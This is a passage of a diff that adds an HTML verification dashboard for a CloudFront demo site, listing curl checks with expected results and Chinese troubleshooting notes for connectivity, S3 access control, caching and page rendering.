@@ -1,0 +1,1563 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CloudFront Demo Platform — Verification Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    /* ===========================================
+       CSS CUSTOM PROPERTIES — AWS Architect Theme
+       =========================================== */
+    :root {
+      --bg-primary: #0f1923;
+      --bg-secondary: #1a2332;
+      --bg-card: #1e2a3a;
+      --bg-card-hover: #243044;
+      --bg-code: #0d1520;
+      --border: #2d3a4a;
+      --border-light: #3d4a5a;
+
+      --text-primary: #e6edf3;
+      --text-secondary: #8b949e;
+      --text-muted: #636c76;
+
+      --aws-orange: #FF9900;
+      --aws-orange-dim: rgba(255, 153, 0, 0.15);
+      --aws-blue: #527FFF;
+      --aws-blue-dim: rgba(82, 127, 255, 0.12);
+
+      --pass: #2ea043;
+      --pass-dim: rgba(46, 160, 67, 0.15);
+      --fail: #f85149;
+      --fail-dim: rgba(248, 81, 73, 0.15);
+      --skip: #636c76;
+      --skip-dim: rgba(99, 108, 118, 0.15);
+      --warn: #d29922;
+
+      --font-display: 'Plus Jakarta Sans', sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+
+      --title-size: clamp(1.5rem, 3vw, 2.5rem);
+      --heading-size: clamp(1rem, 2vw, 1.35rem);
+      --body-size: clamp(0.8rem, 1.2vw, 0.95rem);
+      --small-size: clamp(0.7rem, 1vw, 0.8rem);
+      --mono-size: clamp(0.7rem, 1vw, 0.82rem);
+
+      --radius: 8px;
+      --radius-lg: 12px;
+      --ease: cubic-bezier(0.16, 1, 0.3, 1);
+      --duration: 0.4s;
+
+      --content-max: 980px;
+      --spacing: clamp(1rem, 2vw, 1.5rem);
+    }
+
+    /* ===========================================
+       RESET & BASE
+       =========================================== */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html {
+      scroll-behavior: smooth;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body {
+      font-family: var(--font-display);
+      font-size: var(--body-size);
+      color: var(--text-primary);
+      background: var(--bg-primary);
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    ::selection {
+      background: var(--aws-orange);
+      color: var(--bg-primary);
+    }
+
+    /* ===========================================
+       PROGRESS BAR
+       =========================================== */
+    .progress-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--aws-orange), var(--aws-blue));
+      z-index: 1000;
+      transition: width 0.3s var(--ease);
+      box-shadow: 0 0 12px var(--aws-orange-dim);
+    }
+
+    /* ===========================================
+       HEADER
+       =========================================== */
+    .header {
+      padding: clamp(2rem, 5vw, 4rem) var(--spacing) clamp(1.5rem, 3vw, 2.5rem);
+      max-width: var(--content-max);
+      margin: 0 auto;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 0.6s var(--ease) 0.1s forwards;
+    }
+
+    .header-top {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 6px;
+    }
+
+    .aws-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 10px;
+      background: var(--aws-orange-dim);
+      border: 1px solid rgba(255, 153, 0, 0.25);
+      border-radius: 20px;
+      font-size: var(--small-size);
+      font-weight: 600;
+      color: var(--aws-orange);
+      letter-spacing: 0.02em;
+    }
+
+    .aws-badge svg { width: 14px; height: 14px; fill: var(--aws-orange); }
+
+    .header h1 {
+      font-size: var(--title-size);
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      line-height: 1.2;
+      background: linear-gradient(135deg, var(--text-primary) 0%, var(--text-secondary) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .header-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-top: 12px;
+      font-size: var(--small-size);
+      color: var(--text-secondary);
+    }
+
+    .header-meta span {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .header-meta code {
+      font-family: var(--font-mono);
+      font-size: inherit;
+      color: var(--aws-blue);
+      background: var(--aws-blue-dim);
+      padding: 1px 6px;
+      border-radius: 4px;
+    }
+
+    /* ===========================================
+       STATS BAR
+       =========================================== */
+    .stats-bar {
+      max-width: var(--content-max);
+      margin: 0 auto clamp(1.5rem, 3vw, 2rem);
+      padding: 0 var(--spacing);
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 10px;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeUp 0.6s var(--ease) 0.2s forwards;
+    }
+
+    .stat-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: clamp(10px, 1.5vw, 16px);
+      text-align: center;
+      transition: border-color 0.2s;
+    }
+
+    .stat-card:hover { border-color: var(--border-light); }
+
+    .stat-value {
+      font-size: clamp(1.3rem, 2.5vw, 1.8rem);
+      font-weight: 800;
+      letter-spacing: -0.02em;
+    }
+
+    .stat-value.pass-color { color: var(--pass); }
+    .stat-value.fail-color { color: var(--fail); }
+    .stat-value.skip-color { color: var(--text-muted); }
+    .stat-value.total-color { color: var(--aws-orange); }
+
+    .stat-label {
+      font-size: var(--small-size);
+      color: var(--text-secondary);
+      margin-top: 2px;
+    }
+
+    /* ===========================================
+       SECTION CARDS
+       =========================================== */
+    .main-content {
+      max-width: var(--content-max);
+      margin: 0 auto;
+      padding: 0 var(--spacing) clamp(2rem, 4vw, 4rem);
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .section-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      transition: border-color 0.2s, box-shadow 0.3s;
+      opacity: 0;
+      transform: translateY(15px);
+    }
+
+    .section-card.visible {
+      opacity: 1;
+      transform: translateY(0);
+      transition: opacity 0.5s var(--ease), transform 0.5s var(--ease), border-color 0.2s, box-shadow 0.3s;
+    }
+
+    .section-card:hover {
+      border-color: var(--border-light);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      padding: clamp(12px, 2vw, 18px) clamp(14px, 2vw, 20px);
+      cursor: pointer;
+      user-select: none;
+      gap: 12px;
+      transition: background 0.15s;
+    }
+
+    .section-header:hover { background: var(--bg-card-hover); }
+
+    .section-num {
+      flex-shrink: 0;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--aws-orange-dim);
+      color: var(--aws-orange);
+      font-weight: 700;
+      font-size: var(--small-size);
+      border-radius: 8px;
+      font-family: var(--font-mono);
+    }
+
+    .section-title-group { flex: 1; min-width: 0; }
+
+    .section-title {
+      font-size: var(--heading-size);
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .section-subtitle {
+      font-size: var(--small-size);
+      color: var(--text-secondary);
+      margin-top: 1px;
+    }
+
+    .section-status {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+
+    .section-badge {
+      font-size: var(--small-size);
+      font-weight: 600;
+      font-family: var(--font-mono);
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: var(--skip-dim);
+      color: var(--text-muted);
+    }
+
+    .section-badge.all-pass { background: var(--pass-dim); color: var(--pass); }
+    .section-badge.has-fail { background: var(--fail-dim); color: var(--fail); }
+
+    .chevron {
+      width: 20px;
+      height: 20px;
+      color: var(--text-muted);
+      transition: transform 0.3s var(--ease);
+      flex-shrink: 0;
+    }
+
+    .section-card.open .chevron { transform: rotate(180deg); }
+
+    .section-body {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.4s var(--ease);
+    }
+
+    .section-card.open .section-body { max-height: 8000px; }
+
+    .section-inner {
+      padding: 0 clamp(14px, 2vw, 20px) clamp(14px, 2vw, 20px);
+      border-top: 1px solid var(--border);
+    }
+
+    /* ===========================================
+       TEST ITEMS
+       =========================================== */
+    .test-item {
+      padding: clamp(12px, 1.5vw, 16px) 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .test-item:last-child { border-bottom: none; }
+
+    .test-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .test-name {
+      font-weight: 600;
+      font-size: var(--body-size);
+      line-height: 1.4;
+    }
+
+    .test-desc {
+      font-size: var(--small-size);
+      color: var(--text-secondary);
+      margin-top: 3px;
+    }
+
+    .status-toggle {
+      display: flex;
+      gap: 4px;
+      flex-shrink: 0;
+    }
+
+    .status-btn {
+      width: 28px;
+      height: 28px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      background: transparent;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.15s;
+      color: var(--text-muted);
+    }
+
+    .status-btn:hover { border-color: var(--border-light); }
+
+    .status-btn.active-pass {
+      background: var(--pass-dim);
+      border-color: var(--pass);
+      color: var(--pass);
+    }
+
+    .status-btn.active-fail {
+      background: var(--fail-dim);
+      border-color: var(--fail);
+      color: var(--fail);
+    }
+
+    .status-btn.active-skip {
+      background: var(--skip-dim);
+      border-color: var(--text-muted);
+      color: var(--text-muted);
+    }
+
+    .status-btn svg { width: 14px; height: 14px; }
+
+    /* ===========================================
+       CODE BLOCKS
+       =========================================== */
+    .code-block {
+      position: relative;
+      margin: 8px 0;
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+    }
+
+    .code-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border-bottom: 1px solid var(--border);
+      font-size: 11px;
+      color: var(--text-muted);
+      font-family: var(--font-mono);
+    }
+
+    .copy-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      padding: 2px 8px;
+      background: transparent;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-secondary);
+      font-size: 11px;
+      font-family: var(--font-mono);
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .copy-btn:hover {
+      background: var(--aws-orange-dim);
+      border-color: var(--aws-orange);
+      color: var(--aws-orange);
+    }
+
+    .copy-btn.copied {
+      background: var(--pass-dim);
+      border-color: var(--pass);
+      color: var(--pass);
+    }
+
+    .copy-btn svg { width: 12px; height: 12px; }
+
+    .code-content {
+      padding: 10px 14px;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: var(--mono-size);
+      line-height: 1.55;
+      color: var(--text-secondary);
+      white-space: pre;
+      tab-size: 2;
+    }
+
+    .code-content::-webkit-scrollbar { height: 4px; }
+    .code-content::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+    /* ===========================================
+       EXPECTED RESULT
+       =========================================== */
+    .expected {
+      margin: 8px 0;
+      padding: 8px 12px;
+      background: var(--pass-dim);
+      border-left: 3px solid var(--pass);
+      border-radius: 0 var(--radius) var(--radius) 0;
+      font-size: var(--small-size);
+      color: var(--text-secondary);
+      line-height: 1.7;
+    }
+
+    .expected strong { color: var(--pass); font-weight: 600; }
+
+    /* ===========================================
+       TROUBLESHOOT
+       =========================================== */
+    .troubleshoot { margin: 8px 0 0; }
+
+    .troubleshoot-toggle {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      font-size: var(--small-size);
+      color: var(--text-muted);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px 0;
+      font-family: var(--font-display);
+      transition: color 0.15s;
+    }
+
+    .troubleshoot-toggle:hover { color: var(--warn); }
+
+    .troubleshoot-toggle svg {
+      width: 12px;
+      height: 12px;
+      transition: transform 0.2s var(--ease);
+    }
+
+    .troubleshoot.open .troubleshoot-toggle svg { transform: rotate(90deg); }
+
+    .troubleshoot-body {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s var(--ease);
+    }
+
+    .troubleshoot.open .troubleshoot-body { max-height: 600px; }
+
+    .troubleshoot-content {
+      padding: 8px 0 4px 16px;
+      font-size: var(--small-size);
+      color: var(--text-muted);
+      line-height: 1.8;
+      border-left: 2px solid var(--border);
+    }
+
+    .troubleshoot-content code {
+      font-family: var(--font-mono);
+      font-size: inherit;
+      color: var(--warn);
+      background: rgba(210, 153, 34, 0.1);
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    /* ===========================================
+       BROWSER CHECKLIST
+       =========================================== */
+    .checklist-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 8px;
+      margin: 10px 0;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: var(--small-size);
+      cursor: pointer;
+      transition: all 0.15s;
+      user-select: none;
+    }
+
+    .check-item:hover { border-color: var(--border-light); }
+
+    .check-item.checked {
+      border-color: var(--pass);
+      background: var(--pass-dim);
+    }
+
+    .check-box {
+      width: 16px;
+      height: 16px;
+      border: 1.5px solid var(--border-light);
+      border-radius: 4px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.15s;
+    }
+
+    .check-item.checked .check-box {
+      border-color: var(--pass);
+      background: var(--pass);
+    }
+
+    .check-box svg { width: 10px; height: 10px; color: var(--bg-primary); opacity: 0; }
+    .check-item.checked .check-box svg { opacity: 1; }
+
+    /* ===========================================
+       SUMMARY TABLE
+       =========================================== */
+    .summary-section {
+      max-width: var(--content-max);
+      margin: 0 auto;
+      padding: 0 var(--spacing) clamp(2rem, 4vw, 3rem);
+    }
+
+    .summary-title {
+      font-size: var(--heading-size);
+      font-weight: 700;
+      margin-bottom: 12px;
+      color: var(--text-secondary);
+    }
+
+    .summary-table-wrap {
+      overflow-x: auto;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-lg);
+    }
+
+    .summary-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: var(--small-size);
+    }
+
+    .summary-table th {
+      text-align: left;
+      padding: 10px 12px;
+      border-bottom: 2px solid var(--border);
+      color: var(--text-secondary);
+      font-weight: 600;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      white-space: nowrap;
+    }
+
+    .summary-table td {
+      padding: 8px 12px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-secondary);
+      vertical-align: middle;
+    }
+
+    .summary-table tbody tr:last-child td { border-bottom: none; }
+    .summary-table tr:hover td { background: rgba(255, 255, 255, 0.02); }
+
+    .summary-table td:first-child {
+      font-family: var(--font-mono);
+      color: var(--text-muted);
+      font-size: 11px;
+      white-space: nowrap;
+    }
+
+    .summary-table td:nth-child(2) { color: var(--text-primary); font-weight: 500; }
+
+    .summary-table .cmd {
+      font-family: var(--font-mono);
+      color: var(--aws-blue);
+      font-size: 11px;
+    }
+
+    .result-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+
+    .result-dot.pass { background: var(--pass); }
+    .result-dot.fail { background: var(--fail); }
+    .result-dot.pending { background: var(--text-muted); }
+
+    /* ===========================================
+       FOOTER
+       =========================================== */
+    .footer {
+      max-width: var(--content-max);
+      margin: 0 auto;
+      padding: clamp(1rem, 2vw, 2rem) var(--spacing);
+      text-align: center;
+      font-size: var(--small-size);
+      color: var(--text-muted);
+      border-top: 1px solid var(--border);
+    }
+
+    /* ===========================================
+       FLOATING ACTIONS
+       =========================================== */
+    .fab-group {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      z-index: 999;
+    }
+
+    .fab {
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      background: var(--bg-card);
+      color: var(--text-secondary);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s var(--ease);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .fab:hover {
+      background: var(--aws-orange-dim);
+      border-color: var(--aws-orange);
+      color: var(--aws-orange);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    .fab svg { width: 18px; height: 18px; }
+
+    .toast {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: var(--bg-card);
+      border: 1px solid var(--pass);
+      color: var(--pass);
+      padding: 8px 16px;
+      border-radius: var(--radius);
+      font-size: var(--small-size);
+      font-weight: 500;
+      opacity: 0;
+      pointer-events: none;
+      transition: all 0.3s var(--ease);
+      z-index: 1001;
+    }
+
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+    /* ===========================================
+       ANIMATIONS
+       =========================================== */
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+
+    @media (max-width: 640px) {
+      .stats-bar { grid-template-columns: repeat(2, 1fr); }
+      .section-title { white-space: normal; }
+      .checklist-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <div class="progress-bar" id="progressBar"></div>
+  <div class="toast" id="toast"></div>
+
+  <header class="header">
+    <div class="header-top">
+      <span class="aws-badge">
+        <svg viewBox="0 0 24 24"><path d="M18.75 3.94L12 .64 5.25 3.94 12 7.24l6.75-3.3zM4.5 5.08v8.84L11.25 17.22V8.38L4.5 5.08zM12.75 8.38v8.84l6.75-3.3V5.08L12.75 8.38zM5.25 20.06L12 23.36l6.75-3.3L12 16.76l-6.75 3.3z"/></svg>
+        CloudFront
+      </span>
+    </div>
+    <h1>Verification Dashboard</h1>
+    <div class="header-meta">
+      <span>Site: <code>unice.keithyu.cloud</code></span>
+      <span>Account: <code>434465421667</code></span>
+      <span>Region: <code>ap-northeast-1</code></span>
+    </div>
+  </header>
+
+  <div class="stats-bar">
+    <div class="stat-card"><div class="stat-value total-color" id="statTotal">0</div><div class="stat-label">Total Tests</div></div>
+    <div class="stat-card"><div class="stat-value pass-color" id="statPass">0</div><div class="stat-label">Passed</div></div>
+    <div class="stat-card"><div class="stat-value fail-color" id="statFail">0</div><div class="stat-label">Failed</div></div>
+    <div class="stat-card"><div class="stat-value skip-color" id="statSkip">0</div><div class="stat-label">Remaining</div></div>
+  </div>
+
+  <main class="main-content" id="sections"></main>
+
+  <!-- Summary Table -->
+  <div class="summary-section">
+    <div class="summary-title">Verification Summary</div>
+    <div class="summary-table-wrap">
+      <table class="summary-table" id="summaryTable"></table>
+    </div>
+  </div>
+
+  <footer class="footer">
+    CloudFront Demo Platform Verification &mdash; Keith Yu &middot; AWS Solutions Architect
+  </footer>
+
+  <div class="fab-group">
+    <button class="fab" id="fabReset" title="Reset All">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+    </button>
+    <button class="fab" id="fabCollapse" title="Expand / Collapse All">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 14 10 14 10 20"/><polyline points="20 10 14 10 14 4"/><line x1="14" y1="10" x2="21" y2="3"/><line x1="3" y1="21" x2="10" y2="14"/></svg>
+    </button>
+    <button class="fab" id="fabTop" title="Back to Top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="18 15 12 9 6 15"/></svg>
+    </button>
+  </div>
+
+  <script>
+    /* ===========================================
+       COMPLETE VERIFICATION DATA
+       Faithful to every line in VERIFY.md
+       =========================================== */
+    const SECTIONS = [
+      /* ==================== 0. Quick Health Check ==================== */
+      {
+        id: "health", num: "0", title: "Quick Health Check",
+        subtitle: "基础连通性快速验证",
+        tests: [{
+          id: "health-0",
+          name: "API Health Endpoint",
+          desc: "验证 CloudFront → VPC Origin → ALB → EC2 全链路",
+          cmd: `curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool`,
+          expected: `返回 JSON:<br>status: "ok" / traceId: UUID v4 格式<br>env.nodeEnv: "production" / env.region: "ap-northeast-1"<br>env.dbConfigured: true / env.cognitoConfigured: true / env.dynamoConfigured: true`,
+          troubleshoot: `<code>curl: (6) Could not resolve host</code> — DNS 未生效，检查 Route53 ALIAS 记录<br><code>curl: (35) SSL handshake</code> — ACM 证书未签发或非 us-east-1 区域<br><code>502 Bad Gateway</code> — Origin 不可达，检查 EC2/ALB 健康状态`
+        }]
+      },
+
+      /* ==================== 1. CloudFront → VPC Origin → ALB → EC2 ==================== */
+      {
+        id: "connectivity", num: "1", title: "CloudFront → VPC Origin → ALB → EC2",
+        subtitle: "全链路连通性 & Origin 行为验证",
+        tests: [
+          {
+            id: "conn-health",
+            name: "1.1 API Health Check",
+            desc: "验证后端环境变量和数据库配置",
+            cmd: `curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool`,
+            expected: `status = "ok" / traceId 为合法 UUID v4 格式<br>env.dbConfigured = true / env.cognitoConfigured = true / env.dynamoConfigured = true`,
+            troubleshoot: `<code>env.dbConfigured: false</code> — EC2 上 .env 中 DB_HOST 未配置或 Aurora 集群未就绪<br><code>env.cognitoConfigured: false</code> — COGNITO_USER_POOL_ID 环境变量缺失<br>返回 502/504 — 检查 ALB Target Group 健康状态和 EC2 安全组入站规则`
+          },
+          {
+            id: "conn-debug",
+            name: "1.2 Debug Headers (CloudFront 注入的地理位置等)",
+            desc: "验证 CloudFront 注入的地理位置 & 设备类型信息",
+            cmd: `curl -s https://unice.keithyu.cloud/api/debug | python3 -m json.tool`,
+            expected: `cloudfront 字段应包含:<br>viewerCountry: 如 "JP", "CN", "US" (取决于请求发起地)<br>viewerCity: 如 "Tokyo", "Beijing" 等<br>isDesktop: "true" 或 "false" / isMobile: "true" 或 "false"<br>forwardedFor: 包含客户端真实 IP`,
+            troubleshoot: `cloudfront 全部为 null — Origin Request Policy 未正确配置 CloudFront 地理 header 白名单<br>仅部分为 null — 检查 AllViewerExceptHostHeader 策略中的 headers.items 列表`
+          },
+          {
+            id: "conn-delay",
+            name: "1.3 Delay Test (Origin Timeout 验证)",
+            desc: "验证 Origin Timeout 配置: 2s 延迟正常返回; 60s 请求被上限 cap 到 30s",
+            cmd: `# 2 秒延迟测试\ncurl -s https://unice.keithyu.cloud/api/delay/2000 | python3 -m json.tool\n\n# 边界测试：超过 30 秒上限\ncurl -s https://unice.keithyu.cloud/api/delay/60000 | python3 -m json.tool`,
+            expected: `2000ms: requested=2000, actual≈2000 (±50ms), capped=2000<br>60000ms: requested=60000, capped=30000 (服务端限制最大 30 秒)`,
+            troubleshoot: `请求超时无响应 — CloudFront Origin Read Timeout (默认 60s) 或 ALB Idle Timeout 过短`
+          }
+        ]
+      },
+
+      /* ==================== 2. S3 OAC 静态资源 ==================== */
+      {
+        id: "s3oac", num: "2", title: "S3 OAC 静态资源",
+        subtitle: "S3 Origin Access Control & 自定义错误页面",
+        tests: [
+          {
+            id: "s3-css",
+            name: "2.1 CSS 文件",
+            desc: "通过 CloudFront 访问应返回 200; 直接访问 S3 URL 应返回 403 (OAC 保护)",
+            cmd: `# 通过 CloudFront 访问 (应返回 200)\ncurl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "HTTP/|content-type|x-cache"\n\n# 直接访问 S3 URL (应返回 403, OAC 保护)\n# 替换 BUCKET 为实际桶名 (如 unice-demo-static-xxx)\ncurl -sI "https://unice-demo-static.s3.ap-northeast-1.amazonaws.com/static/css/style.css" | head -3`,
+            expected: `CloudFront: HTTP/2 200, content-type: text/css, x-cache: Miss from cloudfront (首次)<br>S3 直连: HTTP/1.1 403 Forbidden`,
+            troubleshoot: `CloudFront 返回 403 — S3 Bucket Policy 未授权 OAC，检查 aws:SourceArn 条件<br>CloudFront 返回 404 — 静态资源未上传到 S3，运行 <code>scripts/deploy-static.sh</code>`
+          },
+          {
+            id: "s3-img",
+            name: "2.2 商品图片",
+            desc: "验证 images/ 前缀下的图片通过 CloudFront 可访问",
+            cmd: `curl -sI https://unice.keithyu.cloud/images/products/sample.jpg | grep -iE "HTTP/|content-type|x-cache"`,
+            expected: `HTTP/2 200, content-type: image/jpeg, x-cache: Miss from cloudfront`,
+            troubleshoot: `404 — 图片未上传到 S3 的 images/ 前缀下`
+          },
+          {
+            id: "s3-error",
+            name: "2.3 自定义错误页面",
+            desc: "访问不存在的路径应触发 404 自定义错误页面 (品牌化 HTML, 非 JSON 错误)",
+            cmd: `# 查看错误页面内容\ncurl -s https://unice.keithyu.cloud/this-path-does-not-exist-at-all | head -10\n\n# 验证错误页面 HTML 源自 S3\ncurl -sI https://unice.keithyu.cloud/this-path-does-not-exist-at-all | grep -iE "HTTP/|content-type"`,
+            expected: `品牌化 HTML 页面内容，包含 "Page Not Found" 或 "404" 友好提示<br>HTTP/2 404, content-type: text/html`,
+            troubleshoot: `返回 JSON 而非 HTML — CloudFront Custom Error Response 未配置，或 S3 上 /static/errors/404.html 不存在<br>返回默认 CloudFront 错误页 — 检查 <code>custom_error_response</code> 的 <code>response_page_path</code>`
+          }
+        ]
+      },
+
+      /* ==================== 3. CloudFront 缓存策略 ==================== */
+      {
+        id: "cache", num: "3", title: "CloudFront 缓存策略",
+        subtitle: "ProductCache / CachingDisabled / CachingOptimized",
+        tests: [
+          {
+            id: "cache-product",
+            name: "3.1 ProductCache (3600s TTL)",
+            desc: "首次请求 Miss, 二次请求 Hit; 不同 Query String 独立缓存键",
+            cmd: `# 首次请求 (预期 Miss)\ncurl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -iE "x-cache|age"\n\n# 二次请求 (预期 Hit)\ncurl -sI https://unice.keithyu.cloud/api/products?page=1 | grep -iE "x-cache|age"\n\n# 不同 Query String (独立缓存键)\ncurl -sI https://unice.keithyu.cloud/api/products?page=2 | grep -iE "x-cache"`,
+            expected: `首次: x-cache: Miss from cloudfront<br>二次: x-cache: Hit from cloudfront, 且 age 字段 > 0<br>page=2: x-cache: Miss from cloudfront (page=2 是新的缓存键, 与 page=1 独立)`,
+            troubleshoot: `始终 Miss — Cache Policy 的 query_string_behavior 设为 none (应为 all)<br>始终 Miss — 源站响应包含 Cache-Control: no-cache 或 no-store`
+          },
+          {
+            id: "cache-disabled",
+            name: "3.2 CachingDisabled (/api/debug)",
+            desc: "两次请求均应为 Miss (不缓存)",
+            cmd: `# 第一次请求\ncurl -sI https://unice.keithyu.cloud/api/debug | grep -iE "x-cache"\n\n# 第二次请求\ncurl -sI https://unice.keithyu.cloud/api/debug | grep -iE "x-cache"`,
+            expected: `两次均为 x-cache: Miss from cloudfront`,
+            troubleshoot: `出现 Hit — /api/debug* Behavior 绑定了错误的 Cache Policy (应为 CachingDisabled)`
+          },
+          {
+            id: "cache-static",
+            name: "3.3 Static Cache (24h CachingOptimized)",
+            desc: "静态资源二次访问应命中缓存",
+            cmd: `# 首次访问 CSS\ncurl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "x-cache|age|cache-control"\n\n# 二次访问 CSS\ncurl -sI https://unice.keithyu.cloud/static/css/style.css | grep -iE "x-cache|age|cache-control"`,
+            expected: `二次请求 x-cache: Hit from cloudfront`,
+            troubleshoot: `始终 Miss — S3 对象缺少 Cache-Control metadata，重新上传时指定 <code>--cache-control "public, max-age=3600"</code>`
+          }
+        ]
+      },
+
+      /* ==================== 4. SSR 页面渲染 (EJS) ==================== */
+      {
+        id: "ssr", num: "4", title: "SSR 页面渲染 (EJS)",
+        subtitle: "首页 / 商品列表 / 详情 / 购物车 / 登录 / 调试页",
+        tests: [
+          {
+            id: "ssr-home",
+            name: "4.1 首页",
+            desc: "hero 区域 + 推荐商品网格 (最多 8 个)",
+            cmd: `curl -s https://unice.keithyu.cloud/ | grep -iE "<title>|product-card|nav"`,
+            expected: `输出包含 &lt;title&gt; 标签 (含 "首页" 或 "Unice")、导航栏 HTML、商品卡片元素`,
+            troubleshoot: `返回空白或 502 — Express 应用未启动，通过 SSM 检查 <code>pm2 status</code><br>无商品卡片 — 数据库未 seed，运行 <code>node seed.js</code>`
+          },
+          {
+            id: "ssr-list",
+            name: "4.2 商品列表页",
+            desc: "商品卡片 + 分类筛选 + 分页导航",
+            cmd: `# 商品列表\ncurl -s https://unice.keithyu.cloud/products | grep -c "product"\n\n# 检查分页功能\ncurl -s https://unice.keithyu.cloud/products?page=2 | grep -c "product"`,
+            expected: `输出数值 >= 1 (页面中包含商品相关元素)<br>page=2 同样返回商品内容`,
+            troubleshoot: `返回 0 — 数据库未 seed 或商品数据为空`
+          },
+          {
+            id: "ssr-detail",
+            name: "4.3 商品详情页",
+            desc: "商品图片 + 价格 + 加入购物车按钮",
+            cmd: `curl -s https://unice.keithyu.cloud/products/1 | grep -iE "<title>|price|add.*cart"`,
+            expected: `包含商品名称的 &lt;title&gt; 标签、价格信息、加入购物车按钮`,
